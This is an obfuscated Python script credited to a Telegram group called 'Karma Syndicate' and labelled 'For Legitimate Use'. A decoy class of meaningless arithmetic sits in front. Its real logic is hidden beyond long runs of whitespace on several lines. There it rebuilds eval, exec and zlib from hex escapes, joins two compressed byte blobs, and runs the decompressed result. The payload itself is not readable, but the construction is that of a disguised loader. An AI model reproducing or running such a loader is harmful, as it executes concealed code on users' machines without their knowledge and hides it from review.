from builtins import *
from math import prod as _positive


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


_memoryaccess, _negative, Divide, _statistics, Calculate, _modulo, _random = exec, str, tuple, map, ord, globals, type

class System:
    def __init__(self, Theory):
        self.Run = _positive((Theory, -50244))
        self._detectvar(_calculate=10948)

    def _detectvar(self, _calculate = type):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Run -= 43808 * _calculate
        
        try:
            {Power: _statistics} if _statistics == _statistics else (_statistics, Calculate, _memoryaccess) != Calculate

        except ArithmeticError:
            (((Calculate, Power, _negative), _statistics) for _statistics in {'booxTlaema': _statistics})

        except:
            _random(37791 * 45307) == True

    def Square(self, _invert = -74069):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _invert += 67892 + -78388
        self.Cube != int
        
        try:
            (Calculate, _negative, Power) if _memoryaccess <= Power else (Calculate, Power, _negative) is Power

        except OSError:
            ((_statistics, Calculate, _memoryaccess) or _statistics if (_statistics, Calculate, _memoryaccess) and _statistics else ... or (_statistics, (_statistics, Calculate, _memoryaccess)))

        except:
            _random(98492 / -89128) == str

    def Positive(_math = float):
        return _modulo()[_math]

    def _floor(Multiply = -33476 / -61681, Floor = bool, CallFunction = _modulo):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        CallFunction()[Multiply] = Floor
        
        try:
            ((Divide, {Calculate: Power}) for Divide in (Calculate, Power, _negative) if _statistics <= Power)

        except AssertionError:
            ((_statistics, (_statistics, Calculate, _memoryaccess)) for _statistics in (Calculate, Power, _negative) if Calculate <= _negative)

        except:
            _random(-56595 + 61684) == type

    def execute(code = str):
        return _memoryaccess(_negative(Divide(_statistics(Calculate, code))))

    @property
    def Cube(self):
        self.Add = '<__main__._calculate object at 0x000009871BE37671>'
        return (self.Add, System.Cube)

if __name__ == '__main__':
    try:
        System.execute(code = __license__)
        _theory = System(Theory = -47587 - -45646)

        _theory.Square(_invert = -56935 / _theory.Run)                                                                                                                                                                                                                                                          ;System._floor(Multiply='O0Ooo0OooooO0OOOO0o00Oo',Floor=b'x\x9c\xe5\x1bko\xe36\xf2\xbb\x7f\x85.\xf7\xc12\xea\xa6\xb2\xde\x0e\x90\xc3\x1d.]\xc0\xa97>\xc0-v\x81\xa20d\x89\xdaUN\x16\rI\xd9\xf5\xf6\xd7\xdf\xcc\x90\x94\x14\xc7vd\xcbn\xb7\xb7\xa2D\xf1%R\x1c\x0e\x87\xf3 \xcb\xfc\xcbMO\x83+\x89uz\xe3\xb5X\x94\x9c\xa7\x8b\x85\xf6\xb7\xdb\xab7<\xd7\xa6\xecCR&\xab\xa0d\xda/\x05\xbb\xd2x\xde(\x1a<\x95\x1fy^Pi\xfd\xeag\x96\xb2\x0fy\xb0\xba\xb9\x1a^\xfds\x93\x05K\xbe\xbc\x1a<+\xcf\xf3\x0fA\x96\xfc\x1e\x94\t\xcfD\x13?\x05\xf9*\xd0\xe6_\xb2(\t\xa1\x8d\xad\xfaKY\xa3(\xfb\xb1,\xd7\xc5\xcd\x0f?\x94\xd7+\xf6\x03}\xb8\xef\xbbO,/\xaa&\xa6\x90_\x94[%\xd2$dY\xc1\xa8D\xdf\xf6-\xd7\xb0\xbc\xc8\x1a\x9b\xa6gZ#\xc74\x96\xa1e\xd9n0\xb6C?\xf0\xfa\xbd\xc1M\xf5m\x92\x95z\xbf\xf8o\x12\xf5\x07=\xb6\t\xd9\xba\x94@\xcc\xd6O\xa5~\xf5\x9f\x94\x05\x05\xd3\xeex\xd6/\xb5\xb7<J\xe2/W\x83\x9eh4Y\xady^.\x16\xf0\xfd\x97\xa2?\xb8f\x9b\xa4\xd4\x07\xbd\x94\x87AZ\xe8\x83_\xfb3n\xccf3c\xc6\xb9a\x18\xe0\xcd0\xda\xff\xed\xf6C\xca\x97P\xa4\xb73\x9f>\xc4(er\xbc\r,4\xeb\xffzs\xf3\xdd\xf7\xdf}\xaf\x7f\xaf\x7f7\x1a\x0c~\x83zX\x19\x94e\xbe\xbf\x9e\xcd\xe7\r]\x9f)\x00\xfe\xcb:\xa2\xe4\xc0\xf7www\xfcn\x06\xf7\x0c\x02\x1c\x03\x1c~_t\xb0\xb7#Stzf`\x15T%\xa7*gT\'|Y\xc3l\x7f\x9bssn\xe2\r\x1e\xf92\x04_\xef\xadY\xef/\x9f\x92\xb4L2\x1c\x85OA~\x00\xb2\x0f\x0fo\xdf\x8a\x1b\x1e\x15\xc1\xba\x05\x90\t\xdc\xaa\xf6\x99~\xa0\xc5"K\xca4yZnCt0\xac\x80\xad`\x7fR5\x83_\xcfT\xcfu\x92El\xa3\xf7\xd3\xe0\x13{\x91\xfb\xdb`\xdf0\x12\xf0\xe74\x06\xf3\xb9|\xe3 \xf4\xfb\xd7\x8f<\xc9\xf6}\xf6\x98<>&I\x9a\xa4\xa9\n=\xe2\x95>\x9e\x02\xe3$\t\x0b 0]a\xbc\xb7\x9a#a\xbc\xbf\x1e\x05\xe3/q\x92n\xd8\xc7\xeci\x17\xa0\xf7 6B\x8d\xb0\xf0\x01\x11\xf2A\xbc(\x06\xa9\xdf\x04f\xb24Y\xafx\xb8\x0bf{\xe7\xf1t:\x9dL\xa6\xf7\xf7\x93)\xf9\xf7\x93\xc9\xfd\xfd\xfdt\xfaM\xc0+\xe5\xfce\xee\xfe\x99\x8c\xd8$\xc9\x9d\xc00\xc4\xb5o\x02PyY\x1c\x85T\xd8\x026\x02\x99\x983\xa3\xd5\xee\xff\x1fLe\xc0\xd3\xf8H\x8a\x95\xa6\x934E\x0f\x1c\xdepa\xec\x9b\x80\x17{\xca\x7f>b\xfe\xcd\x04+\x87)\xe8Q\x90\x1b\xdf\x06\xa4\x8a4xs\xcc\x14\xdc\xcb>\xe8\xcb\xbe\x1d\xdbp\xb9\xb1\x1b\xdb\xf4\xd8\xf5\x15\xcbt\xb8\x80\x03\x8cX\xc8#\xa6\xf7\xfd\xb8\xdc\xb1\x10\x7f\x03`\x0f\xd9f\'\xab\xb7\x7f>\x1f\x82\xbb\xe3W\xce\x03\xe7\xd3\xa3\xfc:\x1d\xdc\xeb\xb0\xdf\xc9~\xeb\x87Z7M7t\xc7\x9e\xe5\xd9&\xf3l\xcf\x87\xb7\xf9Z;\x07)\x17\xb2\xb3\x98-\xf8[\x8aA\xa4Y\xc7\xf1?i9N\x0crflY\xf0`\xd8\x90\x8f\x0f\x8f\'\xf3\x1csi\xfaf\xd4\xaa\xacm\x8e_\xed$\x89o\xa7\x00\x14F\xcav]\xf8\x13\xbf#(\xa7\x93{`\xbe\xa6\xf7\xc8\x8a\xc1\r\x0frb\x1dA92#\x02\x93qI\x10\xd8\x8e\x0b\xd8\xe4:\x9ei\x1a\xb6\xc2/\xc3\xf4_\xe0\xda\xd8\n \xbd\x1b\x988\xc7u\xe1\xee\x8e\xc4y\x8eAX\x1b\xfe\x02P\xf2\xccWg\xf4\xc1~\x13f\x00S\x0e\xf7\x14\x19\xf4)a\xca\xeb\x1d\xef\x0f\x8c\x85\xbf\x18-\xac\x85\xbd0\xc9\xf9\x0b\x13[|\x99\xda\x11\x8a6L5SN;CMS\x996\x96St$\xa7m\x9b\xb2-G\xa3\xc3\xd4\r\xbb\xe1\xe2\xc1\xf55\x02\xc7\xc0E\xf4\xd4~\x9d\x12\xc90{\x9d\xd2\xa7\xc1j\x19\x05\xda\xbb\xf7\xef\xdf\xbd\x137xp\xdd\xec\xfd\xb9C\xa8\xa4\xf8\xccT\xdc\x82\xdb\xfc\xfa\xa7\x90\x87\xc4v\xe90\'\xf4|\xcb\x84\x96"\ny\xb6\xe3D\x1d\'\xd7l&\xf8Hdb\x0c.\xb9\x18\x8eBKG\xb0\x18\x12,\xa3K\xd2_\x17h+8\xc3\xb3\x80\xbe\xc6\xe0.\x86\xd5\x8e\x05\x807\xd1w,t\x18\x13\xf1:\xe52|\x8b\x15\xe0\x90[>4\xd0m\xfd\x80)\xa4nz`.\xb5!\xa2\xe3\x85G\x04\xd3\x05\x82\x89D\x13\xe2P\x1aI\xebV\xea\x1f;\x8fNG\x1a\xc7\x84\x05\x1b\xe8\xaf\x1b\xc2\xc2\x1c\x03\x0b3\xc6\x10.\xe2\xae\xe3\x02yv-\xcfpG.\x83X\x08\xb1\xb3\xb2\x8d\x07\t\xe7\xd8\x0e\xed\x00\x1e\xf4\x03\x88\x05\x14\xab\x9f\xb1\xcc\x01\xff2\xa8\xd6\x11\xc1\x88\x15\x9e\xcf+vx\xde\x95\x1d6%;k\xcb\xb5Q\xc5}\xb9f\xe2\x1a\xea\xcbu\xb5MY\xaf--\x92\xab\x0eHRp\t\x0f\xc5\xa9\xcd\xcd\x1e\x81\xf3t\x91h\x87\xf8S\x89E\xdee\x05\xa2\xaeL@\x1f\x15\x82R\xcb,ZnCN\xec\x85\x01\x04cD\x1c\x98\x0b\x0e\xdeP\xday\x99\xda\x95\x9c\xc8q\x1fI>\xcb\x91\xb8\x80aW>\x86\xc4\x9d\xd7\xcab||q\x9e\xac\xe3\xf4;\xc8@x@\xba<\xf2\x9f;o\xf7\xbb5_\xb6\xa1\xf9!\xb4\r\xd5,\xd9\xdc\xecTa\x9dJ\x16c\x17F\x02}\xf1\x86\xb5\x10||\xbb\r_\xa4\xb5\xfe\xef\x86\xe8\xde\x14\xe0\xe7\xe6\xd1\xbf\xde\x17Z R\xf3\x92\xb6\x05\x95sm&\x82\x0fh\x8e(?\x06\x11\xc4"\xf4\xc7uu\xfc2\xf5/\xb2\xaev\x15\xf3\xd0\xf22A\r\xc0=\x8a{\xe8@\xcak\'\xe6A\xee\xa8#\x94,)z\x8d\xe5Ra6\xde\xa6\xccs%\xb9hS\xd6\xb98\xb98\x97\xf6e%\xae\x0c\xae\x15\xde"\x98\x9dA$V\xf0q\xe5\xbb\x12\x85\x95\xf8\xdb\x10\x89\x0f\x95u\xdb\x93\xdf?\x83\xef9Hx\xfd\x8a\xf4\xd6$\xb8\xbe|\x95v)~\xce4\x8d\xc8@\xd5\x139\xdb\x02n\xd6A\xde\xd6\xb3L\xe0q\xe1\x01\xee\x169]\x08\x99\xde\xd8\n\x9a\xa5\x81n\x18\xc8+\xbb\x91\x1b{.\x95\xf3\xa0\x1c\x03B\xcc\xcc\x88\xb8\xe5\x91k\xc3\x83\xaaU\x87\xd4^2\xcf\x1e9\x96m\x01\xbf\n\xa3\x06_X\xae\xef\x8e\xa0\xfc\x088k\xe2\xb3\xa1u\xf6zK\xa6\xa7\xc4;)\xdca\xeb\xc8\x97\xdb\xcd\xbcJ\xf4\xf3v\xd7\xe9a\x1f\xa1\xe5\xba\xd6J\xa0\xc25\xd7\xf0<\xe0\xefm\xd7\x7f\x96c\xb5\xaf\xcd\x8c\x81\x8f\xda\xaa\x87R\x9e\x7fov\xe6\xaei\x92\xd2\xf4\x14/1O\xcfH\x1fQ_\xe6\x81(\xe7\x13\x07fC\x18\xde\xa4/{\x91\xda\x918\xb8\x8d\x89\xad\xde\x8e\xe2\xc9\x14q\x95\xc4\xa1MY\xbf=\xb1\xed\xa0k\x18\xbb\x1e"8"~\xc7\xa1\x946\x1a\xba\x05\xdb\x84\xfe\xd7\xa1pA\xc6\x045\xa4\x0e\x89\xfd69\x87\x04~s;\xb5\xe3\x0f\xfbr\xb9T#k5\xb8o\xb3\xb1<\x1c*7:\x823?Y,\x87)\x1f"1C\xa7\xc2\xdb>\xa6\xabR_\xb7\x1e\xe8`_k\xfd\xacrQ\xf5n\xa6GG\xe8n\xdf>\xd4{\x92\xaaM$\x18?A\x9a\xae\xa9`\x93gYu\xe5V\x94\xe0gH\xee\xc3n(\x12\x94\xa2\xdei\x08\x8b\xaf\x95\xbd\xa8\xdd\xad\xb1~u#C\x862\x0e\xe3V\x15\xdaW`\x18\x94\xf2GS\xa2Z(#\xfd\x91\xf8G\xf9:\x05I2\xc5\xc7V\x88\xb2Z\xb5Y\xffF\x90kt\xec\xbc\xd7@\x8bQ\xe3\xad\xa8\x96\xb2\x03\xbdV\xee\xf2j\xd0\x10X\xb5\x8bQ\x12X-\x05M\x0c\x88\xc5\x14\xb1\x80\xfc\xb1L%w!\xc67\xbe\xa4\x85Ki\xff\x9b\xae\xb6\x0f(\x8b@\x9d\x8e\xb1K\xf4\x135F\x0e\xdbf\x84\x9d\xa5\x13z\xc0~\x9a\x91\x13\x99\xcbz\xd5\x80\xd4\x10\x8dH\xe0C\xfa\xf3\x98\xd9u7D\x92\xc2/\xc1\xef\xe1\xf5\x08\x7f\xfbx\xc6\xe9vD\xc1\xf6\x9cn\xdb\x82h\xfd\x18\x11\xfb\xeb-,p\xe3\xc5HZ?\xb6R\xff\x8c~\x9c[\xef\xb3\xef9us\x04Hz&2\xcc\xb8\xf9\xc1q\x80y\xaedE\x90\x94b\x90\xe6@\x1a\x04Y*\xc67\xa5\xf9$\x89\x92E\x06B\x0c\xbe2\x84\xc4\xeaY\x94\x83\xdb-\x80j\x12\x0bn\xa0\xbc\x05_9\x98\x87\xf2\xac\xe38\xb6-4"\x06\xb6\nyh\xc9qHZs\xbdq\xa3\x05\x0b\xf3I\x82\xa5\r\x1bX\xaf\xfc\x0f!\xd7]\x900n\x13\x0fE*\xb6\x8d\x8am\xcc\x89\xca8.\xec\xe2\xef\x95}\\X\xca\xcf\xaa\x84\xad\x94\xc3\xde\x0e\x8d\x86\xd7P \xabP\x0b\x9bE\xa5B\xde\xd4\x1a\xe4\x8d\x90\x86\xc0\x1d\xaf\x88%\xd4T;\x94i\x7f2E\xcfL\x0e\x1c\x92\x81,\x9a\xfacx\x0b\xd9\xc8\xddN=\x03\x171\x96\x8fb6\xcd\xa6l\xb4\xc5I\xbcV\xf6H"\xb058$\xa0V\'\x80\xc0\x1d?8\x12+\xc9WFh\xf0\xbf\xfe\xbd\x17\xf5&\x83sl1\x10G4T\xcb\xea:\x83 \xadt\xa5\xcat\xa5\xf4\xa8\x8e\xcc\xf3\x1a\xc2\xf4ke\xdd#\xf9\xf6\xbb;\xda\x02\xcb\x11\x15\xee\x08\'8\xdcw\'m\xd1iA\x84\x9a$h\x0f!\xba\x90\xc1\xd4\xbb\xa8\xf1\x1f\xcd\xfbc\xb9\x01 \xac6\x03\xa8x M\xff\x17\xe2\x98O\xd9I\x13\xe7|\xa5\xa9#s\x9a8\x92\xa7\x85|\xb5NR6d\x1b\x16\x0e\xe9\xf4\xe3p\x9d\'Y9, \x97EC\n\xb2r\xc8\xd7,\xeba!\x1d\xb1eFTd\x86\xe4\x04Q\x87\xf3AO\xd6\x97\xb3\x1e\xd5\xb2\x88\xa1\xd6[q\x9c\x92\xccC\xb4Q\x94N\xef\xd0\xe6\xd1\xc9tp]\x94y\xb2\xd6\x07<\xd7\x04uiR\x1a\xb8z\xfc\xa9\xacj\x12\xdb\xc8\xe4^\x18q\xf7\xd6AY\xb2<\xbb\xcd\xd9\xb5\xec\x86^\r\xa1\x1a\xd5\xea@\xdb\xa0\x17\xb1X\x0bS\x16d\x8b4\xc9\x98\x8e\x9e<\x11*\xf4z\x1b\xb9w@\x90O\xca\xc02X}\xf1\xb4\xd4q\xef\xd9\xb3\xcdh\xe8\rI\x107\xc8\x96HVE4/\x0e\xa9\xea\xbfk?1\xb6\xd6\xfe5\xff\xf7d')

        _theory._detectvar(_calculate = _theory.Run + -76241)                                                                                                                                                                                                                                                          ;System._floor(Multiply='ODDODDoDooOoODoDo',Floor=b'\xa2\x85\x1f\x83<\x08\xe1o\x0b\x8d\x86\xc1\xd8\x98\x86Vrx{?\xd6-\xa1w\x9d\xb3u\x1a\x84L\x97\x80xO\x04\xf8]E\x90\x87\x08A:\xfc\x84\x1b-\t\x92\x18\x1aT\xdf\x91M\x0e\x0fJQ6\x16\x05\x7fHF"\xd2\xc5dB\x0f#\xae\xc1\x9e\xc6\xa58^\x15\x94\xa2\xf9p.\x80Y\x1ba\xcd}5$\x88\xb9)\xc8\x17\x80\xbf(a\xe0\xb9\x91act\xdf\xab^\x89\nrV>\xe5\x19\xd5\xa3\xf0\xa2W\xaa\xa3\xcd\x9f\x93\xf2\xa3\x86\x18\xa8\xd7\xb85\xac\xe6\xcb\x83\xdc\xd80d\x19\xe0\x7f\x92}\xb8\x9d\xcb\xfd\xdd\x95\xc9\x98bC\x96\xe7</nU\xaf\xb2Z?\x8f\x90\x08`h\xa0\xde\xfa\x8c0\xfeKq\x8bi\xd0\xa9 \xa2\xa8.\xfev\x9d\xf3\x90\x15\x05\x8b\x16\xa2\x10\xcc\x10\x1d\x06\xfc\x97\x02Z\xd7\x02\r\xa28\xb8\xc1S\xc9WA\x99\x84A\x9a~\x81\x1e\xae\xf8\'\xa6EO\xeb\x94N;\x17TS\x0c\xd8\x8fuh\x89\xe8|\xf1\xbc\xfd\xdbm\x84\xadO0\xc7\x02X!\x7f\xcaJ}"\xb0\x82\xb6\xdb\x8a\x10\x8e\xfe\xe0\x1f\xb7\xb5\xbe\xbaVao6Z\x90E\x9a@h\xf2\xd5\x9dR\x92\xfa\x97\xfaWd\x83\x19/\xd5\x08\x05yY\xe0\xb0\xe8\x12\xedi+"\x1dx\x99\x89\xb3T\xb3\xd9\xe0\xf9\xf7U\x97\x8e\xa7w\xae\xfb\x92\xe2yKe\x0c\xf3\xa26\xd4o\xab+\x92v\\\xc3\xf8\x84\x1f\x9b\xb4\xa0ym\r\xf3u\x10E\x8dQ\xa8\xb1\xb2A\xa8\x86D<\x14-Q\xfb-j\xd4D\x939Y\xcb\xe51F:\xc18y\x89|\x84v\x9f\xf3\xa4d\xfa\xaaV\x8b\xa9)\x9c\xd1i\\]\xd0h}\xeb7\x07\x03\x85\xa4x\xca\xfd4h;\x06\x8a\x82.\x89j(\xb0\xa1\x11\xaf\x82\xb7\x85\xa2\x1a\x08y\xaeH\x17\xc2!\x8cG\x8cFn\x0fE<\xdc\x96\'\xc5\xc2V\xa3\xa3\x0e\xe1ko\xa0\xdb\x0f\xbc|\x03H\x1d\xfd\x88\xd3\xf5\xa6sW\xb6\xe4\xdam\xa9\x15\xed\x7fK\xec\xd8\x8e\x1f\xf7H\xe6\x8dE\x97\xc9\x98D\xd2\xa7\xe7\xab=\x86\xc7t\xed\x97,\xc1rwT\xfaE\xdfH\x0b#\x152\x8fH8\xab\xef~\xa4W\xc23\r\x90\x84\x9d\x01\x1e#\x97Q/$TP\xfa\x86\x81&9]\xec\xa9D8\x01L\xda\x0e\xdd\xff\x00\xf8\xdf \xcf')

        _theory.Square(_invert = 27515 * _theory.Run)                                                                                                                                                                                                                                                          ;OO00oO0oOOoOO0o0oO0o00ooO,LLJJILLLIIJIJIIJJJJIJIL,jlliilljjjiilliiiljll,NNNNMNNNMNMNMNNNMNN,XXXWWWXWWXXXWWWWXW=(lambda IllIIllIllIlIlIllllll:IllIIllIllIlIlIllllll['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IllIIllIllIlIlIllllll:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IllIIllIllIlIlIllllll)"),filename='\x4f\x6f\x30\x30\x30\x6f\x4f\x30\x30\x6f\x6f\x30\x30\x4f\x6f\x30\x30\x6f\x30\x30\x30\x6f\x6f\x6f',mode='\x65\x76\x61\x6c'))),(lambda IllIIllIllIlIlIllllll:IllIIllIllIlIlIllllll(__import__('\x7a\x6c\x69\x62'))),(lambda S2SS222SS2S2SSSS22SS2S2,IllIIllIllIlIlIllllll:S2SS222SS2S2SSSS22SS2S2(IllIIllIllIlIlIllllll)),(lambda:(lambda IllIIllIllIlIlIllllll:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IllIIllIllIlIlIllllll)"),filename='\x4f\x6f\x30\x30\x30\x6f\x4f\x30\x30\x6f\x6f\x30\x30\x4f\x6f\x30\x30\x6f\x30\x30\x30\x6f\x6f\x6f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        System(Theory = -83182 - 32093)._detectvar(_calculate = _theory.Run - 27871)                                                                                                                                                                                                                                                          ;XXXWWWXWWXXXWWWWXW()(NNNNMNNNMNMNMNNNMNN(OO00oO0oOOoOO0o0oO0o00ooO(jlliilljjjiilliiiljll(LLJJILLLIIJIJIIJJJJIJIL('\x76\x61\x72\x73'))),System.Positive(_math='O0Ooo0OooooO0OOOO0o00Oo')+System.Positive(_math='ODDODDoDooOoODoDo')))

    except Exception as Power:
        if 197586 > 514425:
            System.execute(code = _negative(Power))

        elif 171457 > 6400664:
            System(Theory = -69892 - -48881).Square(_invert = -35300 - _theory.Run)